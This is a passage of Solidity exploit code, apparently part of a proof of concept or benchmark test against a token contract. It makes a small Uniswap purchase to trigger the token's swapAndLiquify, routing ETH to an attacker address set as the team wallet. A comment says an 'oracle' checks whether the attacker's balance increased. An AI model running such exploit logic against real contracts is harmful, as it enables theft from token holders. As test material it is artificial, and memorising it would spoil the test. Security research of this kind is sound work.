            address weth = TokenTool(TARGET).uniswapV2Router().WETH();
            address[] memory path = new address[](2);
            path[0] = weth;
            path[1] = TARGET;

            // Small buy to trigger swap
            TokenTool(TARGET).uniswapV2Router().swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.01 ether}(
                0,
                path,
                attacker,
                block.timestamp
            );
        }

        // The swapAndLiquify should have been triggered, sending ETH to attacker as team wallet
        // Oracle will check if attacker balance increased
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
